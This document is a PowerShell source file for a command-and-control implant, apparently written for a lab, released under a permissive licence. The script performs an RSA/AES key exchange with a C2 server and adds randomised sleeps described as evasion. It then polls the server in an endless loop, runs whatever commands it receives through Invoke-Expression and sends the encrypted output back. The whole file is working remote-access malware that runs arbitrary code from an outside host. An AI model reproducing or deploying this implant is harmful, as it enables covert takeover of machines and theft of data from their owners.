########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################$ErrorActionPreference = "Stop"

$ErrorActionPreference = "Stop"

# Function to load or generate AgentID
Function Load-AgentID {
    Param ([string]$FilePath)
    If (Test-Path $FilePath) {
        return (Get-Content $FilePath -Raw).Trim()
    } Else {
        $AgentID = [guid]::NewGuid().ToString()
        Set-Content -Path $FilePath -Value $AgentID
        return $AgentID
    }
}

# Function to encrypt using AES-GCM
Function Encrypt-Result-GCM {
    Param ([string]$PlainText, [byte[]]$AESKey)

    $Nonce = New-Object byte[] 12  # 96-bit Nonce
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Nonce)

    $AEAD = New-Object Security.Cryptography.AesGcm($AESKey)
    $PlainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $CipherText = New-Object byte[] $PlainTextBytes.Length
    $Tag = New-Object byte[] 16  # 128-bit authentication tag

    $AEAD.Encrypt($Nonce, $PlainTextBytes, $CipherText, $Tag)

    return [Convert]::ToBase64String($Nonce + $Tag + $CipherText)
}

# Function to decrypt using AES-GCM
Function Decrypt-Result-GCM {
    Param ([string]$CipherTextBase64, [byte[]]$AESKey)

    $CipherData = [Convert]::FromBase64String($CipherTextBase64)
    $Nonce = $CipherData[0..11]
    $Tag = $CipherData[12..27]
    $CipherText = $CipherData[28..($CipherData.Length - 1)]

    $AEAD = New-Object Security.Cryptography.AesGcm($AESKey)
    $PlainTextBytes = New-Object byte[] $CipherText.Length

    Try {
        $AEAD.Decrypt($Nonce, $CipherText, $Tag, $PlainTextBytes)
        return [System.Text.Encoding]::UTF8.GetString($PlainTextBytes)
    } Catch {
        Write-Host "[-] Decryption failed: Integrity check failed!"
        return $null
    }
}

# Function to send beacon
Function Send-Beacon {
    Param ([string]$AgentID, [string]$C2Url, [byte[]]$AESKey)

    Try {
        $Body = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)

        Write-Host "[*] Sending beacon..."
        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
        $EncryptedCommand = $Response.data

        $Command = Decrypt-Result-GCM -CipherTextBase64 $EncryptedCommand -AESKey $AESKey

        If ($Command -ne "NoCommand") {
            Write-Host "[*] Executing command: $Command"
            $Result = Invoke-Expression $Command | Out-String
            $Result = $Result -replace "`r`n", "`n"
            Send-Result -AgentID $AgentID -C2Url $C2Url -Result $Result -AESKey $AESKey
        }
    } Catch {
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Function to send execution result
Function Send-Result {
    Param ([string]$AgentID, [string]$C2Url, [string]$Result, [byte[]]$AESKey)

    Try {
        $EncryptedResult = Encrypt-Result-GCM -PlainText $Result -AESKey $AESKey
        $Body = @{ AgentID = $AgentID; Result = $EncryptedResult } | ConvertTo-Json -Compress
        $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)

        Write-Host "[*] Sending result..."
        Invoke-RestMethod -Uri "$C2Url/result" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
    } Catch {
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Function to import RSA key
Function Import-RSAKey {
    Param ([string]$PublicKeyXML)
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $rsa.FromXmlString($PublicKeyXML)
    return $rsa
}

# Main execution
Try {
    $AgentIDFilePath = "C:\Temp\agent_id.txt"
    $AgentID = Load-AgentID -FilePath $AgentIDFilePath
    $C2Url = "http://10.0.2.4:8000"

    Write-Host "[*] Fetching Public Key..."
    $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
    If (-Not $PublicKeyResponse.PublicKey) { Throw "[-] Failed to retrieve public key" }
    $PublicKeyXML = $PublicKeyResponse.PublicKey

    $RSA = Import-RSAKey -PublicKeyXML $PublicKeyXML

    # Generate AES Key
    $AESKey = New-Object byte[] 32
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
    $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
    
    # Encrypt AES Key with RSA
    $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
    $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
    
    $Body = @{ AgentID = $AgentID; EncAESKey = $EncryptedAESKeyBase64 } | ConvertTo-Json -Compress
    $Body = [System.Text.Encoding]::UTF8.GetBytes($Body)

    Write-Host "[*] Sending encrypted AES key..."
    $Response = Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body $Body -ContentType "application/json; charset=utf-8"
    If ($Response.Status -ne "Success") { Throw "[-] Key exchange failed." }

    # Check-in
    $CheckinBody = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
    $CheckinBody = [System.Text.Encoding]::UTF8.GetBytes($CheckinBody)
    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body $CheckinBody -ContentType "application/json; charset=utf-8"
    
    Write-Host "[*] Agent check-in completed."

    # Time-based evasion
    $SleepTime = Get-Random -Minimum 10 -Maximum 60
    Write-Host "[*] Sleeping for $SleepTime seconds before starting beacon loop."
    Start-Sleep -Seconds $SleepTime

    While ($true) {
        Try {
            Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
        } Catch {
            $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
        }
        $DynamicSleep = Get-Random -Minimum 10 -Maximum 30
        Start-Sleep -Seconds $DynamicSleep
    }
}
Catch {
    $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    Start-Sleep -Seconds 10
}
